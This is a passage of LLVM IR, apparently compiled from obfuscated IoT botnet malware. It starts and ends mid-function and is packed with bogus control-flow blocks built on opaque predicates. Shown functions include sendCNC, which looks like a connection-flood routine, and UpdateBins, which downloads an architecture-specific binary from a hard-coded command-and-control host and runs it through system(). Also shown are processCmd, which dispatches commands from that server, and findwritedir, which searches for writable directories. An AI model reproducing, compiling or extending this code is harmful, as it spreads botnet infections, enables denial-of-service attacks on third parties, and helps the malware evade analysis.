  %168 = sdiv i32 %167, 2
  store i32 %168, i32* %162, align 4
  store i32 0, i32* %155, align 4
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %132
  %169 = load i32, i32* %15, align 4
  %_9 = sub i32 %169, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 %169, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %169, 1
  %gen14 = mul i32 %_13, 1
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %15, align 4
  br label %originalBB8
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

; <label>:22:                                     ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22

; <label>:34:                                     ; preds = %22
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @findwritedir() #0 {
  %1 = load i32, i32* @x.69
  %2 = load i32, i32* @y.70
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca %struct.killerinfo*, align 8
  %11 = alloca %struct.__dirstream*, align 8
  %12 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i32 0, i32 0))
  store %struct.__dirstream* %12, %struct.__dirstream** %11, align 8
  %13 = icmp eq %struct.__dirstream* %12, null
  %14 = load i32, i32* @x.69
  %15 = load i32, i32* @y.70
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %27

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load %struct.killerinfo*, %struct.killerinfo** %10, align 8
  %24 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %23, i32 0, i32 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strcpy(i8* %25, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.97, i32 0, i32 0)) #2
  store i32 1, i32* %9, align 4
  br label %68

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.98, i32 0, i32 0))
  store %struct.__dirstream* %28, %struct.__dirstream** %11, align 8
  %29 = icmp eq %struct.__dirstream* %28, null
  br i1 %29, label %30, label %51

; <label>:30:                                     ; preds = %27
  %31 = load i32, i32* @x.69
  %32 = load i32, i32* @y.70
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load %struct.killerinfo*, %struct.killerinfo** %10, align 8
  %40 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %39, i32 0, i32 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i8* @strcpy(i8* %41, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i32 0, i32 0)) #2
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* @x.69
  %44 = load i32, i32* @y.70
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:51:                                     ; preds = %27
  %52 = load i32, i32* @x.69
  %53 = load i32, i32* @y.70
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %51
  store i32 0, i32* %9, align 4
  %60 = load i32, i32* @x.69
  %61 = load i32, i32* @y.70
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %68

; <label>:68:                                     ; preds = %originalBBpart28, %originalBBpart24, %22
  %69 = load i32, i32* %9, align 4
  ret i32 %69

originalBBalteredBB:                              ; preds = %originalBB, %0
  %70 = alloca i32, align 4
  %71 = alloca %struct.killerinfo*, align 8
  %72 = alloca %struct.__dirstream*, align 8
  %73 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i32 0, i32 0))
  store %struct.__dirstream* %73, %struct.__dirstream** %72, align 8
  %74 = icmp eq %struct.__dirstream* %73, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %75 = load %struct.killerinfo*, %struct.killerinfo** %10, align 8
  %76 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %75, i32 0, i32 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i8* @strcpy(i8* %77, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i32 0, i32 0)) #2
  store i32 1, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %51
  store i32 0, i32* %9, align 4
  br label %originalBB6
}

declare %struct.__dirstream* @opendir(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  %1 = alloca [32 x i8], align 16
  %2 = alloca i8*, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %3 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  %4 = load i8*, i8** %2, align 8
  %5 = call i8* @strcpy(i8* %3, i8* %4) #2
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  ret i8* %6
}

; Function Attrs: noinline nounwind uwtable
define i32 @httpsocket(i8*, i32, i8*, i8*) #0 {
  %5 = load i32, i32* @x.73
  %6 = load i32, i32* @y.74
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [128 x i8], align 16
  %19 = alloca %struct.sockaddr_in, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i8, align 1
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i8* %0, i8** %14, align 8
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i8* %3, i8** %17, align 8
  store i32 0, i32* %23, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %15, align 4
  %31 = trunc i32 %30 to i16
  %32 = call zeroext i16 @htons(i16 zeroext %31) #13
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  %34 = load i8*, i8** %14, align 8
  %35 = call i32 @inet_addr(i8* %34) #2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %37 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %36, i32 0, i32 0
  store i32 %35, i32* %37, align 4
  %38 = load i8*, i8** %17, align 8
  %39 = call i32 (i8*, i32, ...) @open(i8* %38, i32 577, i32 511)
  store i32 %39, i32* %21, align 4
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* %20, align 4
  %41 = load i32, i32* %20, align 4
  %42 = icmp eq i32 %41, -1
  %43 = load i32, i32* @x.73
  %44 = load i32, i32* @y.74
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %42, label %54, label %51

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* %21, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %51, %originalBBpart2
  store i32 0, i32* %13, align 4
  br label %173

; <label>:55:                                     ; preds = %51
  %56 = load i32, i32* %20, align 4
  %57 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 16)
  store i32 %58, i32* %22, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %55
  store i32 0, i32* %13, align 4
  br label %173

; <label>:61:                                     ; preds = %55
  %62 = load i8*, i8** %24, align 8
  %63 = call i8* @strcpy(i8* %62, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0)) #2
  %64 = load i8*, i8** %24, align 8
  %65 = load i8*, i8** %24, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8*, i8** %16, align 8
  %69 = call i8* @strcpy(i8* %67, i8* %68) #2
  %70 = load i8*, i8** %24, align 8
  %71 = load i8*, i8** %24, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = call i8* @strcpy(i8* %73, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.102, i32 0, i32 0)) #2
  %75 = load i8*, i8** %24, align 8
  %76 = call i64 @strlen(i8* %75) #10
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %25, align 4
  %78 = load i32, i32* %20, align 4
  %79 = load i8*, i8** %24, align 8
  %80 = load i32, i32* %25, align 4
  %81 = sext i32 %80 to i64
  %82 = call i64 @write(i32 %78, i8* %79, i64 %81)
  %83 = load i32, i32* %25, align 4
  %84 = sext i32 %83 to i64
  %85 = icmp ne i64 %82, %84
  br i1 %85, label %86, label %103

; <label>:86:                                     ; preds = %61
  %87 = load i32, i32* @x.73
  %88 = load i32, i32* @y.74
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %86
  store i32 0, i32* %13, align 4
  %95 = load i32, i32* @x.73
  %96 = load i32, i32* @y.74
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %173

; <label>:103:                                    ; preds = %61
  br label %104

; <label>:104:                                    ; preds = %114, %103
  %105 = load i32, i32* %23, align 4
  %106 = icmp ne i32 %105, 218762506
  br i1 %106, label %107, label %120

; <label>:107:                                    ; preds = %104
  %108 = load i32, i32* %20, align 4
  %109 = call i64 @read(i32 %108, i8* %26, i64 1)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %27, align 4
  %111 = load i32, i32* %27, align 4
  %112 = icmp ne i32 %111, 1
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %107
  store i32 0, i32* %13, align 4
  br label %173

; <label>:114:                                    ; preds = %107
  %115 = load i32, i32* %23, align 4
  %116 = shl i32 %115, 8
  %117 = load i8, i8* %26, align 1
  %118 = sext i8 %117 to i32
  %119 = or i32 %116, %118
  store i32 %119, i32* %23, align 4
  br label %104

; <label>:120:                                    ; preds = %104
  %121 = load i32, i32* @x.73
  %122 = load i32, i32* @y.74
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i32 0, i32 0))
  %130 = load i32, i32* @x.73
  %131 = load i32, i32* @y.74
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:138:                                    ; preds = %originalBBpart212, %originalBBpart28
  %139 = load i32, i32* %20, align 4
  %140 = getelementptr inbounds [128 x i8], [128 x i8]* %18, i32 0, i32 0
  %141 = call i64 @read(i32 %139, i8* %140, i64 128)
  %142 = trunc i64 %141 to i32
  store i32 %142, i32* %28, align 4
  %143 = load i32, i32* %28, align 4
  %144 = icmp sle i32 %143, 0
  br i1 %144, label %145, label %146

; <label>:145:                                    ; preds = %138
  br label %168

; <label>:146:                                    ; preds = %138
  %147 = load i32, i32* @x.73
  %148 = load i32, i32* @y.74
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %146
  %155 = load i32, i32* %21, align 4
  %156 = getelementptr inbounds [128 x i8], [128 x i8]* %18, i32 0, i32 0
  %157 = load i32, i32* %28, align 4
  %158 = sext i32 %157 to i64
  %159 = call i64 @write(i32 %155, i8* %156, i64 %158)
  %160 = load i32, i32* @x.73
  %161 = load i32, i32* @y.74
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %138

; <label>:168:                                    ; preds = %145
  %169 = load i32, i32* %20, align 4
  %170 = call i32 @close(i32 %169)
  %171 = load i32, i32* %21, align 4
  %172 = call i32 @close(i32 %171)
  store i32 1, i32* %13, align 4
  br label %173

; <label>:173:                                    ; preds = %168, %113, %originalBBpart24, %60, %54
  %174 = load i32, i32* @x.73
  %175 = load i32, i32* @y.74
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %173
  %182 = load i32, i32* %13, align 4
  %183 = load i32, i32* @x.73
  %184 = load i32, i32* @y.74
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %182

originalBBalteredBB:                              ; preds = %originalBB, %4
  %191 = alloca i32, align 4
  %192 = alloca i8*, align 8
  %193 = alloca i32, align 4
  %194 = alloca i8*, align 8
  %195 = alloca i8*, align 8
  %196 = alloca [128 x i8], align 16
  %197 = alloca %struct.sockaddr_in, align 4
  %198 = alloca i32, align 4
  %199 = alloca i32, align 4
  %200 = alloca i32, align 4
  %201 = alloca i32, align 4
  %202 = alloca i8*, align 8
  %203 = alloca i32, align 4
  %204 = alloca i8, align 1
  %205 = alloca i32, align 4
  %206 = alloca i32, align 4
  store i8* %0, i8** %192, align 8
  store i32 %1, i32* %193, align 4
  store i8* %2, i8** %194, align 8
  store i8* %3, i8** %195, align 8
  store i32 0, i32* %201, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %197, i32 0, i32 0
  store i16 2, i16* %207, align 4
  %208 = load i32, i32* %193, align 4
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #13
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %197, i32 0, i32 1
  store i16 %210, i16* %211, align 2
  %212 = load i8*, i8** %192, align 8
  %213 = call i32 @inet_addr(i8* %212) #2
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %197, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  store i32 %213, i32* %215, align 4
  %216 = load i8*, i8** %195, align 8
  %217 = call i32 (i8*, i32, ...) @open(i8* %216, i32 577, i32 511)
  store i32 %217, i32* %199, align 4
  %218 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %218, i32* %198, align 4
  %219 = load i32, i32* %198, align 4
  %220 = icmp eq i32 %219, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %86
  store i32 0, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  %221 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i32 0, i32 0))
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %146
  %222 = load i32, i32* %21, align 4
  %223 = getelementptr inbounds [128 x i8], [128 x i8]* %18, i32 0, i32 0
  %224 = load i32, i32* %28, align 4
  %225 = sext i32 %224 to i64
  %226 = call i64 @write(i32 %222, i8* %223, i64 %225)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %173
  %227 = load i32, i32* %13, align 4
  br label %originalBB14
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %1 = alloca %struct.killerinfo*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = call i32 @findwritedir()
  %5 = load %struct.killerinfo*, %struct.killerinfo** %1, align 8
  %6 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %5, i32 0, i32 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i32 @chdir(i8* %7) #2
  %9 = load i8*, i8** %2, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %11 = load i8*, i8** %2, align 8
  %12 = call i8* @getArch()
  %13 = call i8* @strcpy(i8* %11, i8* %12) #2
  %14 = load i8*, i8** @cncip, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @httpsocket(i8* %14, i32 80, i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %0
  br label %21

; <label>:19:                                     ; preds = %0
  %20 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  br label %55

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* @x.75
  %23 = load i32, i32* @y.76
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i8*, i8** %3, align 8
  %31 = call i8* @strcpy(i8* %30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0)) #2
  %32 = load i8*, i8** %3, align 8
  %33 = load i8*, i8** %3, align 8
  %34 = call i64 @strlen(i8* %33) #10
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  %36 = call i8* @strcpy(i8* %35, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0)) #2
  %37 = load i8*, i8** %3, align 8
  %38 = load i8*, i8** %3, align 8
  %39 = call i64 @strlen(i8* %38) #10
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = call i8* @strcpy(i8* %40, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i32 0, i32 0)) #2
  %42 = load i8*, i8** %3, align 8
  %43 = call i32 @system(i8* %42)
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.108, i32 0, i32 0))
  %46 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %47 = load i32, i32* @x.75
  %48 = load i32, i32* @y.76
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:55:                                     ; preds = %originalBBpart2, %19
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %21
  %56 = load i8*, i8** %3, align 8
  %57 = call i8* @strcpy(i8* %56, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0)) #2
  %58 = load i8*, i8** %3, align 8
  %59 = load i8*, i8** %3, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = call i8* @strcpy(i8* %61, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0)) #2
  %63 = load i8*, i8** %3, align 8
  %64 = load i8*, i8** %3, align 8
  %65 = call i64 @strlen(i8* %64) #10
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = call i8* @strcpy(i8* %66, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i32 0, i32 0)) #2
  %68 = load i8*, i8** %3, align 8
  %69 = call i32 @system(i8* %68)
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = call i32 (i32, i8*, ...) @sockprintf(i32 %70, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.108, i32 0, i32 0))
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.77
  %4 = load i32, i32* @y.78
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %52 = load i8**, i8*** %12, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %56 = icmp ne i32 %55, 0
  %57 = load i32, i32* @x.77
  %58 = load i32, i32* @y.78
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %84, label %65

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.77
  %67 = load i32, i32* @y.78
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* @mainCommSock, align 4
  %75 = call i32 (i32, i8*, ...) @sockprintf(i32 %74, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0))
  %76 = load i32, i32* @x.77
  %77 = load i32, i32* @y.78
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %1553

; <label>:84:                                     ; preds = %originalBBpart2
  %85 = load i32, i32* @x.77
  %86 = load i32, i32* @y.78
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  %93 = load i8**, i8*** %12, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 0
  %95 = load i8*, i8** %94, align 8
